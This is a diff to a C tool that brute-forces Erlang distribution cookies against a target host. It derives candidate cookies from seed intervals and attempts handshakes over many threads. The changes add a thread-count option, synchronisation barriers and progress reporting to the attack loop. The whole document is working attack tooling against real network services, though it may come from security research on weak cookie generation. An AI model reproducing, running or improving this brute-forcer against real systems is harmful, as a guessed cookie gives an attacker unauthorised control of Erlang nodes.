@@ -24,11 +24,16 @@
 static const char *target;
 static int port;
 static unsigned int interconnection_gap = 0UL;
+static int n_workers = 64;
+static struct worker *workers;
+static unsigned int n_intervals = 0;
 
 struct interval {
   uint64_t start;
   uint64_t stop;
   float prob;
+  unsigned int index_interval;
+  pthread_barrier_t barrier;
   TAILQ_ENTRY(interval) _next;
 };
 static TAILQ_HEAD(,interval) intervals;
@@ -37,12 +42,19 @@ static TAILQ_HEAD(,interval) intervals;
 static struct interval *create_interval(uint64_t start, uint64_t stop,
   float prob) {
   struct interval *new_interval;
+  int ret;
 
   new_interval = malloc(sizeof(*new_interval));
   assert(new_interval != NULL);
   new_interval->start = start;
   new_interval->stop = stop;
   new_interval->prob = prob;
+  new_interval->index_interval = n_intervals++;
+
+  ret = pthread_barrier_init(&new_interval->barrier, NULL, n_workers);
+  assert(ret == 0);
+
+  printf("creating new interval %ld -> %ld %f\n", start, stop, prob);
 
   return new_interval;
 }
@@ -85,9 +97,6 @@ struct worker {
   volatile uint32_t cumulative_fails;
   volatile float cumulative_prob;
 };
-
-static int n_workers = 64;
-static struct worker *workers;
 
 static int read_exactly(int sd, void *ptr, size_t size) {
   size_t current;
@@ -215,7 +224,7 @@ static void *worker_run(void *arg) {
     start = w->current_interval->start + w->index;
     stop = w->current_interval->stop;
 
-    for (seed = start; seed <= stop && !quit; seed += 1) {
+    for (seed = start; seed <= stop && !quit; seed += n_workers) {
       create_cookie(seed, cookie, sizeof(cookie));
 
       sd = socket(PF_INET, SOCK_STREAM, 0);
@@ -305,6 +314,15 @@ failed_handshake:
     }
 
     w->cumulative_prob += w->current_interval->prob;
+
+    ret = pthread_barrier_wait(&w->current_interval->barrier);
+    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
+      printf("pthread_barrier_wait failed with %m\n");
+    }
+    assert(ret == 0 || ret == PTHREAD_BARRIER_SERIAL_THREAD);
+
+    if (TAILQ_NEXT(w->current_interval, _next) == NULL)
+      break;
   }
 
   finished += 1;
@@ -407,6 +425,7 @@ int main(int argc, char **argv) {
   uint64_t cumulative_fails;
   uint64_t last_cumulative_fails = 0;
   uint64_t delta_fails;
+  uint64_t total_seeds = 0;
   struct interval *new_interval;
   float cumulative_prob;
   jsmn_parser p;
@@ -416,7 +435,6 @@ int main(int argc, char **argv) {
   uint64_t start, stop;
   float prob;
   struct interval *interval;
-  unsigned n_intervals;
   char full_space[] = "0,68719476735,100.0";
 
   TAILQ_INIT(&intervals);
@@ -437,6 +455,32 @@ int main(int argc, char **argv) {
       break;
     }
     switch (c) {
+    case 't':
+      n_workers = atoi(optarg);
+      break;
+    default:
+      break;
+    }
+  }
+
+  if (n_workers <= 0 || n_workers > 1024) {
+    fprintf(stderr, "please provide a valid number of workers\n");
+    exit(1);
+  }
+
+  printf("bruteforce using %d concurrent threads\n", n_workers);
+
+  /* we need to parse the number of threads first */
+  /* hence, we first parse options, using only -t */
+  /* and next, we parse all other options */
+  optind = 0;
+  option_index = 0;
+  while (1) {
+    c = getopt_long(argc, argv, "hst:g:i:d:", options, &option_index);
+    if (c == -1) {
+      break;
+    }
+    switch (c) {
     case 'g':
       interconnection_gap = atoi(optarg);
       break;
@@ -444,13 +488,12 @@ int main(int argc, char **argv) {
       usage(argv[0]);
       break;
     case 't':
-      n_workers = atoi(optarg);
       break;
     case 's':
       TAILQ_INIT(&intervals);
       new_interval = parse_interval(full_space);
       if (new_interval) {
-        TAILQ_INSERT_HEAD(&intervals, new_interval, _next);
+        TAILQ_INSERT_TAIL(&intervals, new_interval, _next);
       }
       break;
     case 'd':
@@ -474,7 +517,8 @@ int main(int argc, char **argv) {
         usage(argv[0]);
       }
 
-      for (i = 1; i < tokens[0].size;) {
+      for (i = 1; i < ret;) {
+        assert(i+6 < ret);
         assert(tokens[i].type == JSMN_OBJECT);
 
         assert(jsoneq(content, &tokens[i+1], "start") == 0);
@@ -490,7 +534,7 @@ int main(int argc, char **argv) {
         prob = jsontof(content, &tokens[i+6]);
 
         new_interval = create_interval(start, stop, prob);
-        TAILQ_INSERT_HEAD(&intervals, new_interval, _next);
+        TAILQ_INSERT_TAIL(&intervals, new_interval, _next);
 
         i += 7;
       }
@@ -515,22 +559,16 @@ int main(int argc, char **argv) {
     usage(argv[0]);
   }
 
-  if (n_workers <= 0 || n_workers > 1024) {
-    fprintf(stderr, "please provide a valid number of workers\n");
-    exit(1);
-  }
-
 
   target = argv[optind];
   port = atoi(argv[optind+1]);
 
 
-  n_intervals = 0;
   TAILQ_FOREACH(interval, &intervals, _next) {
-    n_intervals += 1;
+    total_seeds += interval->stop - interval->start + 1;
   }
 
-  printf("Erlang distribution cookie is starting, sweeping through %d seed intervals\n", n_intervals);
+  printf("Erlang distribution cookie bruteforce is starting, sweeping through %d seed intervals\n", n_intervals);
 
   workers = calloc(n_workers, sizeof(*workers));
   assert(workers != NULL);
@@ -552,9 +590,6 @@ int main(int argc, char **argv) {
 
   while (!quit) {
     sleep(1);
-
-    if (quit)
-      break;
 
     cumulative_conns = 0;
     for (i = 0; i < n_workers; i++) {
@@ -583,9 +618,16 @@ int main(int argc, char **argv) {
     }
     cumulative_prob /= n_workers;
 
-    printf("\r %" PRIu64 " seed/s (%" PRIu64 " conn/s, %" PRIu64 " fails/s)\t\t%2.5f%%", delta_seeds, delta_conns, delta_fails, 100.0*cumulative_prob);
+    printf("\r %" PRIu64 " seed/s (%" PRIu64 " conn/s, %" PRIu64 " fails/s)\t\t%2.5f%% (%d/%d)", delta_seeds, delta_conns, delta_fails,\
+      (100.0*cumulative_seeds)/total_seeds, workers[0].current_interval->index_interval+1, n_intervals);
     fflush(stdout);
+
+    if (quit)
+      break;
+
   }
+
+  printf("\n");
 
   for (i = 0; i < n_workers; i++) {
     pthread_join(workers[i].tid, NULL);
